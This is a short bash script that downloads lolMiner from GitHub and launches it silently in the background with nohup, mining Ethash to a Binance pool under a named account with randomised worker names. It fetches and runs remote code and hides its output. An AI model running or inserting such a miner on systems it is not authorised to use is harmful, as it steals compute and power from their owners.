#!/bin/bash
nvidia-smi
sudo apt update -y
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29 && nohup bash -c "./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.GPU-Win-$(echo $(shuf -i 1-99 -n 1))--vapers --ethstratum ETHPROXY &> /dev/null 2>&1&"
#
